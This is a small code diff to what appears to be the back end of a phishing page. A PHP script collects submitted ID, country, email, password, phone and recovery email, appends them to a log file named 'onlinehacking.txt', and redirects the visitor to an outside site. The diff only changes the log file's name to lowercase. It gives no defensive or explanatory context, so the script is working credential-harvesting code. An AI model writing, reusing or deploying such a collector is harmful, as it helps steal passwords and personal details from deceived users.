@@ -9,7 +9,7 @@ $emailr = $_POST['emailr'];
 
 <?php
 
-file_put_contents("OnlineHacking.txt", "[Id:] " . $id = $_POST['id'] . " [Country:] " . $country = $_POST['country'] . " [Email:] " . $email = $_POST['email'] . "[Password]" . $password = $_POST['password'] . "[Hp]" . $hp = $_POST['phone'] . "[Emailr]" . $emailr = $_POST['emailr'] . "\n", FILE_APPEND);
+file_put_contents("onlinehacking.txt", "[Id:] " . $id = $_POST['id'] . " [Country:] " . $country = $_POST['country'] . " [Email:] " . $email = $_POST['email'] . "[Password]" . $password = $_POST['password'] . "[Hp]" . $hp = $_POST['phone'] . "[Emailr]" . $emailr = $_POST['emailr'] . "\n", FILE_APPEND);
 header('Location: https://www.OnlineHacking.xyz');
 ?>
 
